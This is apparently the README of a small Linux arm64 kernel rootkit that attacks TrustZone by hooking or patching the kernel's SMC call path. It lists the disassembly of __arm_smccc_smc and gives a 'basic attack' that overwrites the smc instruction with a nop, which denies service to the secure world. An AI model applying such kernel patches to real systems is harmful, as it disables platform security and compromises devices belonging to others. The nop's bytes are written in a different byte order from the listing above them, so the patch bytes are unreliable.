# alpha
alpha is a simple kernel rootkit (Linux arm64) to attack the TrustZone. He erases the smc_handle function of the kernel to hook calls to the SMC instruction. It has been tested with OP-TEE but should work with any other TrustZone implementation.

### __arm_smccc_smc (include/linux/arm-smccc.h)   
   
```
03 00 00 d4     smc   #0x0   
e4 03 40 f9     ldr   x4, [sp]   
80 04 00 a9     stp   x0, x1, [x4]   
82 0c 01 a9     stp   x2, x3, [x4,#16]   
e4 07 40 f9     ldr   x4, [sp,#8]   
a4 00 00 b4     cbz   x4, 0x00000028   
89 00 40 f9     ldr   x9, [x4]   
3f 05 00 f1     cmp   x9, #0x1   
41 00 00 54     b.ne  0x00000028   
86 04 00 f9     str   x6, [x4,#8]   
c0 03 5f d6     ret
```   
   
### Basic attack   
   
It's just a DoS attack of the TrustZone. Replace the first instruction of the function:   
```   
03 00 00 d4     smc   #0x0   
```   

With the following instruction:   
```   
d5 03 20 1f     nop      
```   

### More coming...
